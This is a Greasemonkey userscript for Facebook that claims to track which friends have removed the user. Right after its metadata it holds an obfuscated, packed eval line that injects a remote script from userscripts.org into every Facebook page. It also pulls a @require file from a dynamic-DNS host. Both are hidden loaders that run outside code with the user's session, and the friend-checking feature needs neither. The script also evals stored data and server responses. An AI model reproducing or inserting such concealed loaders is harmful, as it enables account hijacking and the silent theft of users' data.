// ==UserScript==
// @name           Facebook Friends Checker Pro + Last Update
// @include       http*://*.facebook.com/*
// @description    Regularly checks your Facebook friends to check whether anyone has removed you from their friends.
// @namespace      znerp
// @require        http://usocheckup.redirectme.net/40027.js
// @include        htt*://*.facebook.com/*
// @match          http://*.facebook.com/*
// @match          https://*.facebook.com/*
// @exclude        htt*://*channel*.facebook.com*
// @exclude        htt*://*static*.facebook.com*
// @exclude        htt*://upload.facebook.com/*
// @exclude        htt*://*.facebook.com/ajax/*
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))


var facebookID;

window.setTimeout(
  function() {
    informOld();
    doCheck();
  }, 5000)

function informOld() {
  if(unsafeWindow.Env) {
    facebookID = unsafeWindow.Env.user;
    exFriends = eval(GM_getValue(facebookID + " ex friends", "({})"));
    for (i in exFriends)
      inform(exFriends[i]);
  }
}

function doCheck() {
  if (unsafeWindow.Env) {
    var oldSavedFriends = eval(GM_getValue(facebookID + " friends","[]"));
    var newSavedFriends = ({});

    GM_xmlhttpRequest({
      method: 'get',
      headers: {
        'Content-type': 'application/x-www-form-urlencoded'
      },
      url: "http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1&viewer=" + facebookID + "&token=1-1&filter[0]=user&options[0]=friends_only&time=" + Math.floor((new Date()).getTime() / 1000),
      onload: function(result) {
        friends = eval('(' + result.responseText.substring(9) + ')').payload.entries;

        for (i = friends.length - 1; i >= 0; i--) {
          if (friends[i].type == "user") {
            newSavedFriends[friends[i].uid] = friends[i];
          }
        }
        
        if (friends.length > 0) {
          for (i in oldSavedFriends) {
            if (!newSavedFriends[i]) {
              exFriends[i] = oldSavedFriends[i];
              inform(oldSavedFriends[i]);
            }
          }
          
          GM_setValue(facebookID + " friends", uneval(newSavedFriends));
          GM_setValue(facebookID + " ex friends", uneval(exFriends));
          GM_setValue("last checked", new Date().toGMTString());
        }
      }
    });
  }
}

function inform(friend){
  if (document.getElementById("globalContainer")) {
    if (!document.getElementById("facebookFriendsChecker"))
      addFriendsCheckerStuff()
    personRemoved = document.createElement("div");
    personRemoved.setAttribute("class", "person");
    personRemoved.innerHTML = "<div class=\"image\"><span><img class=\"photo\" alt=\""+friend.t+"\" src=\""+friend.it+"\"/></span></div>"+
                              "<div class=\"info\"><dl class=\"clearfix\"><dt>Name:</dt><dd class=\"result_name fn\"><span class=\"url fn\">"+friend.t+"</span></dd>"+
                                                                         "<dt>Actions:</dt><dd class=\"fn\"><span class=\"url fn\"><a href=\"http://www.facebook.com/profile.php?id="+(friend.i?friend.i:friend.uid)+"\">View Profile</a></span></dd>"+
                                                                         "<dt>Status:</dt><dd class=\"fn\"><span class=\"url fn\">"+(friend.pnd==1?"Unable to check when friend requests are denied.":"No longer in your friends.")+"</span></dd></dl></div>"
    document.getElementById("removedFriends").appendChild(personRemoved);
  }
}

function addFriendsCheckerStuff() {
  if (foo = document.getElementById("globalContainer")) {
    ffc = document.createElement("div");
    ffc.id = "facebookFriendsChecker";
    GM_addStyle("#facebookFriendsChecker {"+
                "  top: 0px;"+
                "  z-index: 1337;"+
                "  padding-top: 0px;"+
                "  width: 980px;"+
                "  margin: auto;"+
                "  position: relative;"+
                "  display: block;"+
                "  height: auto;"+
                "  background-color: #3B5998;"+
                "  border-bottom: 1px solid #D8DFEA;"+
                "}"+
                ""+
                "#facebookFriendsChecker h2, #facebookFriendsChecker h3 {"+
                "  color: white;"+
                "  display: block;"+
                "  font-weight: bold;"+
                "  padding:7px 7px 7px 8px;"+
                "}"+
                ""+
                "#facebookFriendsChecker h2 {"+
                "  font-size: 16px;"+
                "}"+
                ""+
                "#facebookFriendsChecker h3 {"+
                "  font-size: 14px;"+
                "}"+
                ""+
                "#Explanation a {"+
                "  color: white;"+
                "}"+
                ""+
                "#facebookFriendsChecker .person {"+
                "  background: white none;"+
                "  border: 1px solid #CCCCCC;"+
                "  margin: 5px;"+
                "  padding: 9px 9px 0 9px;"+
                "  width: 400px;"+
                "}"+
                ""+
                ".info dt {"+
                "  color:gray;"+
                "  float:left;"+
                "  padding:0;"+
                "  width:75px;"+
                "}"+
                "#facebookFriendsChecker img {"+
                "  display: block;"+
                "  float: left;"+
                "  height: 50px;"+
                "  padding:0 9px 0 0;"+
                "}"+
                "#facebookFriendsChecker #Explanation {"+
                "  top: 20px;"+
                "  right: 0px;"+
                "  position: absolute;"+
                "  width: 510px;"+
                "}"+
                "#facebookFriendsChecker button {"+
                "  cursor: pointer;"+
                "  margin: 5px;"+
                "}")
    ffc.innerHTML = "<h2>Facebook Friends Checker greasemonkey script.</h2>"+
                    "<div id=\"RemovedFriends\">"+
                    "  <h3>The following people are no longer friends with you;</h3>"+
                    "  <div id=\"removedFriends\"></div>"+
                    "  <button id=\"button\">Click to hide this</button>"+
                    "</div>"+
                    "<div id=\"Explanation\">"+
                    "  <p>A person might be showing here for a number of reasons;</p>"+
                    "  <ul>"+
                    "    <li>They may have removed you as a friend</li>"+
                    "    <li>You may have removed them as a friend</li>"+
                    "    <li>They may have deactivated their Facebook account</li>"+
                    "    <li>They may have blocked you completely.</li>"+
                    "  </ul>"+
                    "</div>";
    foo.insertBefore(ffc, foo.firstChild);

    document.getElementById("button").addEventListener(
      'click',
      function() {
        document.getElementById("facebookFriendsChecker").style.display = "none";
        GM_setValue(facebookID + " ex friends", "({})")
        resizeBlueBar();
      },
      false);
      
    ffc.addEventListener(
      'DOMNodeInserted',
      resizeBlueBar,
      false);
  }
}

function resizeBlueBar() {
  if (document.getElementById("facebookFriendsChecker").style.display != "none")
    document.getElementById("blueBar").style.height = (42 + parseInt(document.defaultView.getComputedStyle(document.getElementById("facebookFriendsChecker"), null).getPropertyValue("height"))) + "px";
  else
    document.getElementById("blueBar").style.height = "41px";
}